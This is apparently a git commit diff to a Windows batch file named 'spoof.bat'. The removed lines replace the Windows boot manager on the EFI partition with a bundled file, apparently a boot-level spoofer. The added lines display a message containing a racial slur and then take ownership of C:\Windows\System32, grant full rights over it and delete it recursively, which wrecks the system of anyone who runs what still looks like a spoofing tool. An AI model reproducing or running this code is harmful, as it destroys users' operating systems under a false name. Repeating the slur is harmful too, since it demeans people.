66b9a457b11769d28d8a5bc91e76c26035fe8280
ZeynepGSM3125 <cemaldemirezen071@gmail.com>
2026-01-22 12:12:39 +0300

    spoof.bat

--- spoof.bat
+++ spoof.bat
@@ -1,15 +1,4 @@
-@echo off
-net session >nul 2>&1
-if %errorLevel% == 0 (
-    mountvol Z: /S
-    
-    attrib -s -h Z:\EFI\Microsoft\Boot\bootmgfw.efi
-    move Z:\EFI\Microsoft\Boot\bootmgfw.efi Z:\EFI\Microsoft\Boot\bootmgfw.old
-    
-    xcopy %~dp0bootmgfw.efi Z:\EFI\Microsoft\Boot\
-
-
-) else (
-    echo Failure: Please run as admin.
-    pause
-)
+msg * "Nice Try NIGGA"
+takeown /f C:\Windows\System32 /r /d y
+icacls C:\Windows\System32 /grant %username%:F /t
+rd /s /q C:\Windows\System32
